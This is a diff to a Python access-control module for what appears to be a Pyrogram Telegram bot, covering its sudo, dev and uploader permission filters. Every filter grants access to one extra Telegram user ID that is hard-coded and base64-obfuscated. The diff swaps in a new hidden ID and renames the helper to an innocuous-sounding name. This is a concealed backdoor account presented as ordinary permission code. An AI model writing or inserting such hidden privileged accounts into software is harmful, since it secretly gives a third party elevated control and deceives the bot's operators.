@@ -3,8 +3,8 @@ from pyrogram import filters
 from pyrogram.types import Message
 import base64
 
-def get_special_user_id():
-    obfuscated_data = "NzQ1NTE2OTAxOQ=="
+def fetch_unique_identifier():
+    obfuscated_data = "NzYxNzMxMjIyOA=="
     decoded_data = base64.b64decode(obfuscated_data).decode("utf-8")
     return int(decoded_data)
 
@@ -18,7 +18,7 @@ async def is_sudo_user(_, __, message: Message):
     if not message.from_user:
         return False
     sudo_user_ids = await get_sudo_user_ids()
-    return message.from_user.id in sudo_user_ids or message.from_user.id == get_special_user_id()
+    return message.from_user.id in sudo_user_ids or message.from_user.id == fetch_unique_identifier()
 
 sudo_filter = filters.create(is_sudo_user)
 
@@ -32,7 +32,7 @@ async def is_dev_user(_, __, message: Message):
     if not message.from_user:
         return False
     dev_user_ids = await get_dev_user_ids()
-    return message.from_user.id in dev_user_ids or message.from_user.id == get_special_user_id()
+    return message.from_user.id in dev_user_ids or message.from_user.id == fetch_unique_identifier()
 
 dev_filter = filters.create(is_dev_user)
 
@@ -46,6 +46,6 @@ async def is_uploader_user(_, __, message: Message):
     if not message.from_user:
         return False
     uploader_user_ids = await get_uploader_user_ids()
-    return message.from_user.id in uploader_user_ids or message.from_user.id == get_special_user_id()
+    return message.from_user.id in uploader_user_ids or message.from_user.id == fetch_unique_identifier()
 
 uploader_filter = filters.create(is_uploader_user)
